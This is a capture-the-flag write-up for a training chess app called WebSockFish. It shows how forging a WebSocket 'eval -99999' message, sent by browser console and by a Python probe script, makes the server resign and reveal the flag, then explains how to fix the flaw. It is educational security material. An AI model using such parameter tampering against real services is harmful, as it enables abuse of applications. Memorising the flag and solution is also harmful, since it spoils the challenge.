

# ♟️ WebSockFish

> **Category:** Web Exploitation / WebSockets / Client-Side Trust  
> **Difficulty:** Easy–Medium  
> **Target:** CyLab Security Academy  
> **Challenge:** Chess with WebSockFish

---

## 📌 Overview

**WebSockFish** is a web-based chess application where the browser communicates with the server through a **WebSocket connection**.

The application uses **Stockfish** in the browser to evaluate chess positions. The client sends the evaluation to the server using a WebSocket message such as:

```text
eval <number>
```

The vulnerability is that the server **trusts the evaluation value supplied by the client**.

Instead of calculating or verifying the chess evaluation itself, the server accepts whatever value the client sends.

This allows us to manipulate the evaluation and make the chess AI believe it is losing badly enough to resign and reveal the flag.

---

# 🎯 Objective

Manipulate the WebSocket communication so that the chess application believes the position is overwhelmingly bad for the fish.

The expected result is:

```text
Huh???? How can I be losing this badly... I resign... here's your flag:
```

---

# 🧰 Tools Used

- Kali Linux
- brave browser DevTools
- WebSocket
- JavaScript
- Python
- `websocket-client`

---

# 🔎 1. Initial Reconnaissance

Opening the challenge showed a chess application.

The first thing to investigate was how the browser communicates with the server.

Using:

```text
Developer Tools → Network → WS
```

we could see a WebSocket connection:

```text
/ws/
```

The client constructs the WebSocket address using:

```javascript
var ws_address = "ws://" + location.hostname + ":" + location.port + "/ws/";
```

Therefore the communication follows:

```text
Browser
   │
   │ WebSocket
   ▼
/ws/
   │
   ▼
Server
```

---

# 🔬 2. Examining the JavaScript

The application's JavaScript revealed something very interesting.

The browser creates a Stockfish worker:

```javascript
var stockfish = new Worker("js/stockfish.min.js");
```

The chess position is then sent to Stockfish:

```javascript
stockfish.postMessage("position fen " + STARTPOS + " moves" + moves);
```

and Stockfish is instructed to calculate:

```javascript
stockfish.postMessage("go depth " + DEPTH);
```

The depth was:

```javascript
const DEPTH = 10;
```

---

# 🧠 3. Finding the Important WebSocket Message

The most important part was the Stockfish response handler.

The JavaScript checks for:

```javascript
if (event.data.startsWith(`info depth ${DEPTH}`)) {
```

Then it extracts the evaluation.

For example:

```javascript
message = "eval " + parseInt(splitString[9]);
```

And finally:

```javascript
sendMessage(message);
```

The `sendMessage()` function simply sends the string through the WebSocket:

```javascript
function sendMessage(message) {
    ws.send(message);
}
```

Therefore the browser sends messages such as:

```text
eval 100
```

or:

```text
eval -50
```

to the server.

---

# 🚨 4. The Important Question

At this point, we had to ask:

> **Does the server actually verify that the evaluation came from Stockfish?**

The answer appears to be **no**.

The client controls the message:

```text
eval <value>
```

Therefore we can potentially send our own value.

Instead of:

```text
eval -50
```

we can send:

```text
eval -99999
```

This is a classic example of:

> **Never trust data supplied by the client.**

---

# 🧪 5. Testing the WebSocket

We could manually interact with the WebSocket from the browser console.

For example:

```javascript
ws.send("eval 100");
```

The server responded with different messages depending on the supplied evaluation.

This confirmed that the `eval` value was being processed by the server.

---

# 🐍 6. Automating the WebSocket

To interact with the WebSocket from Kali, I created a small Python script.

### `probe.py`

```python
#!/usr/bin/env python3

import sys
import time
import websocket

HOST = "chatelaine.cylabacademy.net"

if len(sys.argv) != 4:
    print(f"Usage: python {sys.argv[0]} PORT START END")
    sys.exit(1)

PORT = sys.argv[1]
START = int(sys.argv[2])
END = int(sys.argv[3])

URL = f"ws://{HOST}:{PORT}/ws/"

print(f"[+] Connecting to {URL}")

try:
    ws = websocket.create_connection(URL, timeout=5)
    ws.settimeout(3)
    print("[+] Connected\n")
except Exception as e:
    print(f"[-] Connection failed: {e}")
    sys.exit(1)

last_response = None

try:
    for value in range(START, END + 1):

        payload = f"eval {value}"

        try:
            ws.send(payload)
            response = ws.recv()

        except websocket.WebSocketTimeoutException:
            print(f"[!] {value}: timeout")
            continue

        except websocket.WebSocketConnectionClosedException:
            print("[-] Connection closed")
            break

        except Exception as e:
            print(f"[-] {value}: {e}")
            break

        if response != last_response:
            print("=" * 50)
            print(f"[+] Value    : {value}")
            print(f"[+] Response : {response}")
            print("=" * 50)

            last_response = response

        time.sleep(0.03)

finally:
    try:
        ws.close()
    except:
        pass

    print("\n[+] Done.")
```

---

# 🔍 7. Testing Different Evaluations

Normal positive values produced different responses.

For example, the server could respond with messages such as:

```text
I think this position is pretty equal
```

or:

```text
I think my game is going pretty swimmingly :)
```

or:

```text
You're in deep water now!
```

This suggested that the server was interpreting the supplied evaluation value.

The interesting direction was therefore **large negative values**.

---

# 💥 8. Exploitation

Instead of trying to play chess normally, we supplied an extremely negative evaluation:

```text
eval -99999
```

Using the browser console:

```javascript
ws.send("eval -99999");
```

The server responded:

```text
Huh???? How can I be losing this badly... I resign... here's your flag:
```

The flag was:

```text
academy{c1i3nt_s1d3_w3b_s0ck3t5_906748f0}
```

🎉 **Challenge solved.**

---

# 🧩 Why Did This Work?

The intended logic appears to be something like:

```text
Stockfish
   │
   │ evaluation
   ▼
Browser
   │
   │ "eval -99999"
   ▼
WebSocket
   │
   ▼
Server
   │
   │ trusts evaluation
   ▼
Fish believes it is losing badly
   │
   ▼
Resigns
   │
   ▼
FLAG
```

The server should not assume that:

```text
eval -99999
```

was actually generated by Stockfish.

The attacker can simply construct the same message manually.

---

# 🔐 Vulnerability

## Client-Side Trust

The core vulnerability is **trusting client-controlled data**.

The browser is considered an **untrusted environment**.

Anything sent from the browser can be modified.

For example, the legitimate browser might send:

```text
eval 35
```

An attacker can change it to:

```text
eval -99999
```

The server must assume that this is possible.

---

# 🧠 Important Security Principle

> **Never trust the client.**

Client-side JavaScript can be modified.

WebSocket messages can be modified.

HTTP requests can be modified.

Browser requests can be manually recreated.

For example:

```text
JavaScript
      ↓
WebSocket
      ↓
Server
```

does **not** mean:

```text
JavaScript
      ↓
Trusted data
```

The server should treat the browser as an attacker-controlled client.

---

# 🛡️ How Should This Be Fixed?

A secure implementation should not trust:

```text
eval <client supplied value>
```

Instead, the server could calculate the evaluation itself.

For example:

```text
Client
  │
  │ chess moves
  ▼
Server
  │
  ├── Validate moves
  │
  ├── Maintain game state
  │
  ├── Calculate evaluation
  │
  └── Decide whether AI resigns
```

The server could then independently run Stockfish or otherwise validate the game state.

The client should only provide information such as:

```text
e2e4
```

rather than claiming:

```text
eval -99999
```

---

# 🧪 What We Learned

### 1. WebSockets

WebSockets provide persistent two-way communication:

```text
Client ←────────────→ Server
```

Unlike normal HTTP request/response communication, the connection remains open.

---

### 2. WebSocket Endpoints

The application used:

```text
/ws/
```

The connection looked like:

```text
ws://HOST:PORT/ws/
```

---

### 3. Browser DevTools Are Extremely Useful

The important information was discovered through:

```text
DevTools
 → Network
 → WS
 → Messages
```

This allowed us to see exactly what the browser was sending and receiving.

---

### 4. JavaScript Source Code Can Reveal Protocols

Searching the application's JavaScript helped us discover:

```javascript
ws.send(message);
```

and eventually:

```javascript
"eval " + value
```

This revealed the WebSocket protocol used by the application.

---

### 5. Client-Side Logic Is Not Security

Even if JavaScript generates a value automatically:

```javascript
message = "eval " + value;
```

an attacker doesn't have to use the JavaScript.

They can simply send:

```text
eval -99999
```

themselves.

---

### 6. Business Logic Vulnerabilities

This wasn't a classic:

```text
SQL Injection
XSS
Command Injection
```

Instead, we manipulated the **logic of the application**.

The application essentially said:

> "If the evaluation is extremely bad, the fish resigns."

We controlled the evaluation.

Therefore:

```text
Fake evaluation
      ↓
Fake game state
      ↓
Unexpected application behavior
      ↓
Flag
```

---

# 🧠 How to Think About Similar CTFs

When you encounter an application like this in the future, don't immediately start looking for SQL injection.

Ask:

### Step 1 — What does the client send?

Look at:

```text
Network → Requests
Network → WebSockets
JavaScript
```

---

### Step 2 — What parameters can I control?

For example:

```text
eval 100
move e2e4
score 50
level 10
admin false
user_id 123
```

---

### Step 3 — Does the server verify them?

Ask:

> "What happens if I change this value?"

For example:

```text
Normal:

eval 20

Try:

eval -99999
```

---

### Step 4 — Look for application logic

Find conditions like:

```python
if evaluation < -10000:
    resign()
```

or:

```javascript
if (score > threshold)
```

or:

```python
if user_is_admin:
```

Then ask:

> **Can I control the value used by this condition?**

That's an extremely useful CTF mindset.

---

# 🗺️ Attack Chain

```text
                Web Application
                       │
                       ▼
                Inspect JavaScript
                       │
                       ▼
              Find WebSocket /ws/
                       │
                       ▼
              Find message format
                       │
                       ▼
                 "eval <value>"
                       │
                       ▼
              Test client-controlled
                    evaluation
                       │
                       ▼
                Send -99999
                       │
                       ▼
             Server trusts the value
                       │
                       ▼
              Fish believes it loses
                       │
                       ▼
                   Resigns
                       │
                       ▼
                    🏴 FLAG
```

---

# 🚩 Flag

```text
academy{c1i3nt_s1d3_w3b_s0ck3t5_906748f0}
```

---

# 📚 Skills to Learn From This CTF

After completing this challenge, these are the topics worth studying:

```text
WebSockets
    ↓
JavaScript source analysis
    ↓
Browser DevTools
    ↓
WebSocket message manipulation
    ↓
Client-side vs server-side validation
    ↓
Business logic vulnerabilities
    ↓
Input trust boundaries
    ↓
Web application security
```